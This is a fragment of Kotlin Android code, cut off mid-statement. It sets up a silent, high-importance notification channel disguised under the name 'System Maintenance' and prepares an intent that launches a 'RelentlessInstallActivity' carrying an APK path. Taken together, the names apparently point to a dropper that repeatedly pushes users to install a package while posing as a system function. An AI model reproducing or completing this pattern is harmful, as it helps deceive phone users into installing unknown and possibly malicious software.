    val nm = getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
    val channelId = "system_integrity_enforcement"

    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
        val channel = android.app.NotificationChannel(channelId, "System Maintenance", android.app.NotificationManager.IMPORTANCE_HIGH)
        channel.setSound(null, null)
        nm.createNotificationChannel(channel)
    }

    val intent = Intent(this, RelentlessInstallActivity::class.java).apply {
        putExtra("apk_path", apkPath)
        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_USER_ACTION)
    }

    val pendingIntent = android.app.PendingIntent.getActivity(
